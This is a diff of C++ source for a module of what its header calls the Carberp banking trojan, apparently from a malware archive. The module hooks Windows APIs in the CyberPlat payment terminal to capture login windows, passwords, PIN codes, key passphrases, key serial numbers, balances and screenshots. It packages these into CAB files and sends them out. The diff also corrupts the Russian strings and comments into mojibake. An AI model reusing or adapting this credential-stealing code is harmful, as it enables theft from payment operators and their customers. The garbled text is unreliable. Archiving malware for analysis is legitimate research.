@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "Cyberplat.h"
 
 #include "CabPacker.h"
@@ -14,7 +25,7 @@
 #include "DbgTemplates.h"
 
 
-// Объявляем шаблон вывода отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 #define Cuber_LDBG DBGOutMessage<>
 
 
@@ -37,10 +48,10 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 	plstrcpyW( FileName, lpFileName );
 	if ( GetFileFormat( (WCHAR*)FileName ) == 0x1AF2F9 )
 	{		
-		HWND hCPlatForm = (HWND)pFindWindowA( NULL, "Идентификация пользователя 1.0.0.28" );
+		HWND hCPlatForm = (HWND)pFindWindowA( NULL, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 1.0.0.28" );
 		if ( hCPlatForm != NULL )
 		{
-			Cuber_LDBG( "СyberPlat","нашли окно идентификатции пользователей");
+			Cuber_LDBG( "пїЅyberPlat","пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 			HWND hKeyName  = (HWND)pFindWindowExA( hCPlatForm, 0, "ComboBox", 0 );
 			HWND hPassword = (HWND)pFindWindowExA( hCPlatForm, 0, "Edit",	  0 );
 			
@@ -101,7 +112,7 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 					MemFree( Buffer );
 
 
-                    // Создаём скриншот
+                    // пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					PCHAR ScreenFile = File::GetTempNameA();
 					
 					bool bAddScreen = ScreenShot::CaptureScreenA(ScreenFile);
@@ -113,7 +124,7 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 
 						if ( Path )
 						{
-							Cuber_LDBG("СyberPlat","склепаем ка каб");
+							Cuber_LDBG("пїЅyberPlat","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ");
 							HCAB hCab = CreateCab( Path );
 
 							if ( hCab )
@@ -150,7 +161,7 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 
 								m_memcpy( pBank->FilePath, Path, m_lstrlen( Path ) );								
 
-								Cuber_LDBG("СyberPlat","Отправляем данные");
+								Cuber_LDBG("пїЅyberPlat","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 								DataGrabber::SendCabDelayed(NULL, pBank->FilePath, "cyberplat");
                                 pDeleteFileA(pBank->FilePath);
 //								StartThread( SendBSSInist, pBank );
@@ -159,7 +170,7 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 
 						STR::Free( Path );
 					}
-					Cuber_LDBG("СyberPlat","мочим вспомогательные файлы"); 
+					Cuber_LDBG("пїЅyberPlat","пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ"); 
 					pDeleteFileA( TempFile   );
 					pDeleteFileA( ScreenFile );
 
@@ -226,7 +237,7 @@ BOOL WINAPI HOOK_ExtTextOutW(HDC hdc, int x, int y, UINT options, CONST RECT * l
 	int len = m_wcslen(lpString);
 	if ( (hWnd) && (len > dwDotLen) )
 	{
-		if ( 0 == m_wcsncmp((WCHAR *)lpString, (WCHAR *)L"ИТОГО:", dwDotLen ) )
+		if ( 0 == m_wcsncmp((WCHAR *)lpString, (WCHAR *)L"пїЅпїЅпїЅпїЅпїЅ:", dwDotLen ) )
 		{
 			static DWORD bBufSize = 256;
 			char *szBuf = (char*)MemAllocAndClear(bBufSize);
@@ -241,7 +252,7 @@ BOOL WINAPI HOOK_ExtTextOutW(HDC hdc, int x, int y, UINT options, CONST RECT * l
 				{
 					lenBalance = len;
 					m_wcsncpy( balance, (WCHAR*)wBalance, len );
-					Cuber_LDBG( "СyberPlat", "Баланс = %ls", balance );
+					Cuber_LDBG( "пїЅyberPlat", "пїЅпїЅпїЅпїЅпїЅпїЅ = %ls", balance );
 				}
 				//OutputDebugStringA(szBuf);
 			}
@@ -289,7 +300,7 @@ void HookCyberplat()
 			__asm mov [Real_ExtTextOutW], eax
 		}
 		bCyberplatHooks = true;
-		Cuber_LDBG( "СyberPlat", "Хуки стоят" );
+		Cuber_LDBG( "пїЅyberPlat", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );
 	}
 
 	return;
@@ -328,7 +339,7 @@ bool GrabCyber( HWND hCyberForm )
 
 		pSendMessageTimeoutA( hCyberForm, WM_COMMAND, 0x00008006, 0, 0, 300, 0 );	
 	
-		HWND hOptions = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "Настройки" );
+		HWND hOptions = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		
 		if ( hOptions != NULL )
 		{
@@ -344,7 +355,7 @@ bool GrabCyber( HWND hCyberForm )
 
 					if ( hListBox != NULL )
 					{
-						HWND hOptButton = (HWND)pFindWindowExA( hDialog, 0, MAKEINTATOM( 0xC017 ), "Свойства точки" );
+						HWND hOptButton = (HWND)pFindWindowExA( hDialog, 0, MAKEINTATOM( 0xC017 ), "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );
 
 						if ( hOptButton != NULL )
 						{
@@ -352,7 +363,7 @@ bool GrabCyber( HWND hCyberForm )
 
  							HCAB hCab = CreateCab( CabName );
 
-							int ItemsCount = (int)pSendMessageA( hListBox, LB_GETCOUNT, 0, 0 );	//количество элементов в листбоксе
+							int ItemsCount = (int)pSendMessageA( hListBox, LB_GETCOUNT, 0, 0 );	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						
 							for ( int i = 0; i < ItemsCount; i++ )
 							{
@@ -362,7 +373,7 @@ bool GrabCyber( HWND hCyberForm )
 								pSendMessageA( hListBox, LB_SETCURSEL, i, 0 );
 								pSendMessageTimeoutA( hOptButton, BM_CLICK, 0, 0, 0, 100, NULL );
 					
-								HWND hPointOpts = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "Свойства точки" );		
+								HWND hPointOpts = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ" );		
 								
 								if ( hPointOpts != NULL )
 								{
@@ -389,16 +400,16 @@ bool GrabCyber( HWND hCyberForm )
 
 									if ( hFile != (HANDLE)-1 )
 									{
-										Cuber_LDBG("СyberPlat","формируем все данные и готовим их к отправке"); 
-										char Template_0[] = "Название: %s\r\n";
-										char Template_1[] = "Код дилера: %s\r\n";
-										char Template_2[] = "Код точки приема: %s\r\n";
-										char Template_3[] = "Источник ключей: %s\r\n";
-										char Template_4[] = "Путь к ключам: %s\r\n";
-										char Template_5[] = "Кодовая фраза: %s\r\n";
-										char Template_6[] = "Повтор кодовой фразы: %s\r\n";
-										char Template_7[] = "Серийный номер закрытого ключа точки: %s\r\n";
-										char Template_8[] = "Серийный номер открытого ключа банка: %s\r\n";
+										Cuber_LDBG("пїЅyberPlat","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ"); 
+										char Template_0[] = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_1[] = "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_2[] = "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_3[] = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_4[] = "пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_5[] = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_6[] = "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_7[] = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+										char Template_8[] = "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ: %s\r\n";
 
 										char OutBuffer[1024];
 
@@ -469,11 +480,11 @@ bool GrabCyber( HWND hCyberForm )
 
 								if ( hListBox != NULL )
 								{
-									HWND hOptButton = (HWND)pFindWindowExA( hUsersDialog, 0, MAKEINTATOM( 0xC017 ), "Свойства пользователя" );
+									HWND hOptButton = (HWND)pFindWindowExA( hUsersDialog, 0, MAKEINTATOM( 0xC017 ), "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 
 									if ( hOptButton != NULL )
 									{
-										int ItemsCount = (int)pSendMessageA( hListBox, LB_GETCOUNT, 0, 0 );	//количество элементов в листбоксе
+										int ItemsCount = (int)pSendMessageA( hListBox, LB_GETCOUNT, 0, 0 );	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 						
 										for ( int i = 0; i < ItemsCount; i++ )
 										{
@@ -483,7 +494,7 @@ bool GrabCyber( HWND hCyberForm )
 											pSendMessageA( hListBox, LB_SETCURSEL, i, 0 );
 											pSendMessageTimeoutA( hOptButton, BM_CLICK, 0, 0, 0, 100, NULL );
 										
-											HWND hUserOpts = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "Свойства пользователя" );		
+											HWND hUserOpts = (HWND)pFindWindowExA( 0, 0, MAKEINTATOM( 0x8002 ), "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );		
 											
 											if ( hUserOpts != NULL )
 											{
@@ -510,12 +521,12 @@ bool GrabCyber( HWND hCyberForm )
 
 													
 
-													char Template_1[] = "Логин: %s\r\n";
-													char Template_2[] = "Пароль: %s\r\n";
-													char Template_3[] = "Пароль: %s\r\n";
-													char Template_4[] = "Код оператора: %s\r\n";
-													char Template_5[] = "Код точки приема: %s\r\n";
-													char Template_6[] = "Пин код: %s\r\n";
+													char Template_1[] = "пїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+													char Template_2[] = "пїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+													char Template_3[] = "пїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+													char Template_4[] = "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+													char Template_5[] = "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ: %s\r\n";
+													char Template_6[] = "пїЅпїЅпїЅ пїЅпїЅпїЅ: %s\r\n";
 
 													char OutBuffer[1024];
 
@@ -644,11 +655,11 @@ bool IsCyberPlatPC()
 /*
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
-	Восстановить !!!!!!!!!!!!!!!!!!!!!!!!!!!
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ !!!!!!!!!!!!!!!!!!!!!!!!!!!
 
 	if (FileExistsA(dd))
 	{
-		СybertartStart(dir);
+		пїЅybertartStart(dir);
 	}
 
 
@@ -661,7 +672,7 @@ bool IsCyberPlatPC()
 
 	MemFree( ModulePath );
 
-	// Истину возвращаем если хэш равен хэшу необходимому имени модуля
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return dwProcessHash == 0x210FD341;/* cyberterm.exe */
 }
 
@@ -676,7 +687,7 @@ BOOL CALLBACK EnumWindowsProcCP( HWND hWnd, LPARAM lParam )
 
 	if ( Title != NULL )
 	{
-		if ( CompareUrl( "Модуль платежей*", Title ) )
+		if ( CompareUrl( "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*", Title ) )
 		{
 			if ( !bCyber )
 			{
